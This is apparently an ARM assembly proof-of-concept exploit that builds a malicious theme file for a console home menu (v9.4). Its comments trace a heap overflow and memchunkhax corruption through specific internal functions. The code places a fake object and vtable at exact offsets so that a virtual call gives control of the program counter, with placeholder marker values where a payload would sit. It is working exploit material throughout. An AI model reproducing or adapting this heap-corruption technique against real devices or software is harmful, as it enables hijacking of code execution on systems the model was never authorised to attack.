.arm
.section .init
.global _start

@ This is the start of the decompressed theme data.

/*
All function addresses referenced here are for v9.4 homemenu.

The memchunkhax(triggered by the buf overflow + memfree) triggers overwriting the saved r4 on the L_22fb34 stackframe, with value=<address of the below object label>. This is the function which called the memfree function.
After calling some func which decreases some counter, homemenu then executes L_1ca5d0(r4), where r4 is the above overwritten ptr.
L_1ca5d0: This first writes u8 value 1 to 0x3b7e. After checking/using other state, this function eventually executes: L_1d1ea8(*(inr0+0x3a60), 1);//where inr0=above ptr
L_1d1ea8: After using other state, it executes: return L_2441a0(*(inr0+0x2f0), inr1);
L_2441a0: L_1e95e0(*(inr0+4)); ...
L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from objectptr> ...//This is where this haxx finally gets control over an objectptr(r0) + PC at the same time.
*/

#define HEAPBUF 0x35052080

_start:

themeheader:
.word 1 @ version

.space ((themeheader + 0xc4) - .)

object:
.word HEAPBUF + (vtable - _start) @ object+0, vtable ptr
.word HEAPBUF + (object - _start) @ Ptr loaded by L_2441a0, passed to L_1e95e0 inr0.
.word 0 @ Memchunk-hdr stuff writes here.
.word 0

.space ((object + 0x28) - .)
.word HEAPBUF + (object - _start) @ Actual object-ptr loaded by L_1e95e0, used for the vtable functr +8 call.

.space ((object + 0x2f0) - .)
.word HEAPBUF + (object - _start) @ Ptr loaded by L_1d1ea8, passed to L_2441a0 inr0.

.space ((object + 0x3a60) - .)
.word HEAPBUF + (object - _start) @ Ptr loaded by L_1ca5d0, passed to L_1d1ea8() inr0.

vtable:
.word 0x50504f52, 0x50504f53, 0x50504f54, 0x50504f55, 0x50504f56 @ vtable+0

.word 0x58584148, 0x58584149, 0x5858414a, 0x5858414b, 0x5858414c, 0x5858414d, 0x5858414e

.space ((vtable + 0x100) - .)

